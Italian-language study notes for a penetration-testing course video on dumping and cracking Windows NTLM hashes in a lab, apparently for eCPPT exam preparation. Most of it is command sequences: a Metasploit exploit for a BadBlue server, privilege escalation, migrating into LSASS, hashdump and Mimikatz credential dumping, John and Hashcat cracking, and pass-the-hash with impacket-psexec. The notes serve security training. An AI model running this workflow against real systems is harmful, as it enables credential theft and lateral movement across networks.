# 024 — Dumping & Cracking NTLM Hashes (Network Penetration Testing)

> **Modulo:** Network Penetration Testing · **Video:** 24/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [024_Dumping___Cracking_NTLM_Hashes.mp4.txt](024_Dumping___Cracking_NTLM_Hashes.mp4.txt) · [024_Dumping___Cracking_NTLM_Hashes.mp4.srt](024_Dumping___Cracking_NTLM_Hashes.mp4.srt)

## Concetti chiave

- **SAM (Security Accounts Manager)** = database locale Windows con gli hash delle password utente. File: `C:\Windows\System32\config\SAM`. **Bloccato** quando l'OS gira.
- **LSA / LSASS** (Local Security Authority Subsystem Service) = processo Windows che gestisce auth → contiene **hash in memoria** + a volte clear-text (WDigest, Kerberos).
- **LM hash** (legacy) — disabilitato da **Windows Vista** in poi.
- **NT/NTLM hash** = MD4(password Unicode). Case-sensitive, supporta simboli/Unicode.
- Tool dump: **`hashdump`** (meterpreter), **Mimikatz** / **Kiwi** (meterpreter `load kiwi`), `secretsdump.py` (impacket), `pwdump`.
- Crack: **John the Ripper** (`--format=nt`), **Hashcat** (`-m 1000` NTLM, `-m 3000` LM, `-m 5500` NetNTLMv1, `-m 5600` NetNTLMv2).
- Privilegi necessari: **admin elevated + migrate in lsass.exe** (o `getsystem`).

## Spiegazione approfondita

### Pre-requisiti tecnici
- **Account admin elevated** (UAC bypassed, integrity level high/system).
- File SAM cifrato con **SysKey** → si dumpano gli hash dalla cache di LSASS in memoria.
- **Migrate** o esegui da processo con privilege SYSTEM (`getsystem` → ok).

### Step 1 — Initial access (lab)
Target = BadBlue web server (vulnerabile). Modulo Metasploit:
```
msf6 > service postgresql start         # serve per persistenza loot/creds
msf6 > msfconsole
msf6 > search bad_blue
msf6 > use exploit/windows/http/badblue_passthru
msf6 > set RHOSTS <target>
msf6 > set LHOST <kali>
msf6 > exploit
# → meterpreter session su Windows Server 2012 R2 (admin)
```

### Step 2 — Verifica privilegi + migrate
```
meterpreter > sysinfo
meterpreter > getuid                    # Administrator
meterpreter > getprivs                  # SeDebugPrivilege presente
meterpreter > getsystem                 # → NT AUTHORITY\SYSTEM
meterpreter > migrate -N lsass.exe      # migra nel processo LSASS
```

### Step 3 — Dump hash con `hashdump`
```
meterpreter > hashdump
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
# Bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```
Formato: `username:RID:LM:NT:::`
- LM `aad3b435b51404eeaad3b435b51404ee` = LM disabled (placeholder).
- Terzo campo = **NTLM hash** (quello da crackare).

### Step 4 — Dump con Mimikatz / Kiwi
```
meterpreter > load kiwi
meterpreter > help
# Kiwi Commands: creds_all, creds_kerberos, creds_msv, creds_ssp, creds_tspkg, creds_wdigest, ...
meterpreter > kiwi_cmd "privilege::debug"
meterpreter > kiwi_cmd "sekurlsa::logonpasswords"
# Dump utenti loggati, NTLM hash, eventualmente clear-text (WDigest abilitato).
meterpreter > creds_all
```

Alternativa offline con impacket (richiede SAM+SYSTEM hive):
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump administrator:password@<target>     # via SMB
```

### Step 5 — Crack con John the Ripper
```bash
cat > hashes.txt <<EOF
Administrator:500:aad3b435...:8846f7eaee8fb117ad06bdd830b7586c:::
Bob:1001:aad3b435...:64f12cddaa88057e06a81b54e73b949b:::
EOF

john --format=nt hashes.txt
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=nt hashes.txt
# Output: Administrator:password · Bob:password1
```

### Step 6 — Crack con Hashcat
```bash
# Estrai solo l'hash NTLM (4° campo)
cut -d: -f4 hashes.txt > nt_only.txt

hashcat -m 1000 nt_only.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 nt_only.txt rockyou.txt --show
```

Mode hashcat utili:
| Mode | Tipo |
|---|---|
| **1000** | NTLM (NT hash) |
| **3000** | LM |
| **5500** | NetNTLMv1 |
| **5600** | NetNTLMv2 (responder!) |
| **13100** | Kerberos TGS-REP (Kerberoasting) |
| **18200** | Kerberos AS-REP (AS-REP Roasting) |

### Step 7 — Crack via Metasploit
```
msf6 > use auxiliary/analyze/jtr_crack_fast            # oppure crack_windows
msf6 > set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
msf6 > run
# Hash già nel DB (creds) → usa John internamente
msf6 > creds                                          # mostra cleartext recuperati
```

### Step 8 — Cosa fare con gli hash
- **Pass-the-Hash** (no cracking necessario): `impacket-psexec -hashes :<NTHASH> administrator@<target>`.
- **Lateral movement**: riprovare lo stesso hash su altri host (riuso password admin locale).
- **Crack offline** → password chiara per RDP/RDP/SSH/VPN.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `meterpreter > getsystem` | Eleva a NT AUTHORITY\SYSTEM |
| `meterpreter > migrate -N lsass.exe` | Migra in LSASS |
| `meterpreter > hashdump` | Dump NTLM hash SAM |
| `meterpreter > load kiwi` | Carica Mimikatz |
| `meterpreter > creds_all` | Dump credenziali (kiwi) |
| `meterpreter > kiwi_cmd "sekurlsa::logonpasswords"` | Mimikatz raw |
| `impacket-secretsdump <opts>` | Dump remoto/offline |
| `john --format=nt hashes.txt` | Crack NTLM con John (formato `nt`) |
| `john --wordlist=<wl> --format=nt hashes.txt` | Crack con wordlist |
| `john --show --format=nt hashes.txt` | Mostra crack riusciti |
| `hashcat -m 1000 <hashes> <wordlist>` | Crack NTLM con Hashcat |
| `hashcat -m 5600 <hashes> <wordlist>` | Crack NetNTLMv2 (responder) |
| `use auxiliary/analyze/crack_windows` (msf) | Crack via Metasploit (usa John) |
| `impacket-psexec -hashes :<NT> user@host` | Pass-the-Hash |

## Esempi pratici

```bash
# Workflow completo
sudo service postgresql start
sudo msfconsole
```

```
msf6 > use exploit/windows/http/badblue_passthru
msf6 > set RHOSTS <target> ; set LHOST <kali>
msf6 > exploit

meterpreter > getsystem
meterpreter > migrate -N lsass.exe
meterpreter > hashdump > /tmp/hashes.txt
meterpreter > load kiwi
meterpreter > creds_all
```

```bash
# Crack offline
john --format=nt /tmp/hashes.txt
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt
john --show --format=nt /tmp/hashes.txt

# Hashcat
cut -d: -f4 /tmp/hashes.txt > nt.txt
hashcat -m 1000 nt.txt /usr/share/wordlists/rockyou.txt

# Pass-the-Hash (no cracking)
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@<target>
```

Nota extra: la NT hash di `password` è notoriamente `8846f7eaee8fb117ad06bdd830b7586c` (utile come canary durante demo).

## Punti d'attenzione per l'esame eCPPT

- **SAM** = `C:\Windows\System32\config\SAM`, bloccato a runtime → dump da LSASS in memoria.
- **LM disabled** da Vista in poi → vedi placeholder `aad3b435b51404eeaad3b435b51404ee`.
- **NTLM** = MD4 della password Unicode; case-sensitive.
- Hashcat modes:
  - **`-m 1000`** NTLM
  - **`-m 3000`** LM
  - **`-m 5500`** NetNTLMv1
  - **`-m 5600`** NetNTLMv2 (responder)
  - **`-m 13100`** Kerberoasting TGS
  - **`-m 18200`** AS-REP Roasting
- John format: **`--format=nt`** per NTLM, `--format=netntlmv2`, `--format=krb5tgs`.
- **`getsystem`** + **`migrate lsass.exe`** = prerequisito per hashdump/Mimikatz.
- **Mimikatz/Kiwi**: `sekurlsa::logonpasswords` è la nuked command.
- **Pass-the-Hash**: con `impacket-psexec -hashes :<NTHASH>` non serve crackare.
- Formato dump SAM: `user:RID:LM:NT:::`.
- **DB Metasploit** salva creds (`creds`/`loot`) se `postgresql` è up.

## Collegamenti con altri video

- Precedente: [[023_Linux_Black-Box_Penetration_Test.mp4]]
- Prossimo: [[025_Windows_Post-Exploitation_Lab.mp4]]
- Catena con SMB Relay: [[021_SMB_Relay_Attack.mp4]] (hash relayato live invece di crackato).
- Pass-the-Hash AD: modulo Active Directory (Pass-the-Hash, Pass-the-Ticket).
- Cracking ticket Kerberos: [[011_Kerberoasting]] (AD), AS-REP Roasting.
- Post-ex generale: [[025_Windows_Post-Exploitation_Lab.mp4]]
